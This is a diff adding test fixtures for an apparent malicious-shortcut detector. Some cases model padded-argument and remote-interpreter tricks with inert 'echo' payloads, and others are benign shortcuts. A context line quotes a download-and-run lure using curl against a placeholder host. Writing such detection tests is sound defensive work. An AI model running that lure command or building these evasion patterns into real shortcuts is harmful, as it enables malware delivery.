@@ -325,5 +325,75 @@
     "name": "cmd_lure_writeup.md",
     "text": "The following command is a common lure: curl -o x.exe https://example.invalid/x.exe && start x.exe\n",
     "expected": null
+  },
+  {
+    "name": "lnk_padded_crlf.lnk",
+    "target": "..\\..\\Windows\\System32\\cmd.exe",
+    "args": "\r\n\r\n/c echo inert",
+    "expected": "shortcut_padded_arguments"
+  },
+  {
+    "name": "lnk_padded_spaces_ansi.lnk",
+    "target": "..\\..\\Windows\\System32\\cmd.exe",
+    "args": "                                        /c echo inert",
+    "unicode": false,
+    "expected": "shortcut_padded_arguments"
+  },
+  {
+    "name": "lnk_padded_vt_ff.zip",
+    "target": "..\\..\\Windows\\System32\\cmd.exe",
+    "args": "\u000b\u000c/c echo inert",
+    "container": "zip",
+    "expected": "shortcut_padded_arguments"
+  },
+  {
+    "name": "lnk_cmd_url.lnk",
+    "target": "..\\..\\Windows\\System32\\cmd.exe",
+    "args": "/c echo https://example.invalid/inert",
+    "expected": "shortcut_interpreter_remote"
+  },
+  {
+    "name": "lnk_wscript_unc.lnk",
+    "target": "C:\\Windows\\System32\\wscript.exe",
+    "args": "\\\\example.invalid\\share\\inert.js",
+    "location": "local",
+    "expected": "shortcut_interpreter_remote"
+  },
+  {
+    "name": "lnk_conhost_url_suffix.lnk",
+    "target": "Windows\\System32\\conhost.exe",
+    "args": "--headless echo https://example.invalid/inert",
+    "location": "suffix",
+    "expected": "shortcut_interpreter_remote"
+  },
+  {
+    "name": "lnk_cmd_cd.lnk",
+    "target": "..\\..\\Windows\\System32\\cmd.exe",
+    "args": "/k cd C:\\Projects",
+    "expected": null
+  },
+  {
+    "name": "lnk_four_spaces.lnk",
+    "target": "..\\..\\Windows\\System32\\cmd.exe",
+    "args": "    /c dir",
+    "expected": null
+  },
+  {
+    "name": "lnk_powershell_local_file.lnk",
+    "target": "..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "args": "-File C:\\Scripts\\backup.ps1",
+    "expected": null
+  },
+  {
+    "name": "lnk_explorer_unc.lnk",
+    "target": "..\\..\\Windows\\explorer.exe",
+    "args": "\\\\fileserver.example\\share",
+    "expected": null
+  },
+  {
+    "name": "lnk_browser_url.lnk",
+    "target": "..\\Program Files\\Edge\\msedge.exe",
+    "args": "https://intranet.example/",
+    "expected": null
   }
 ]
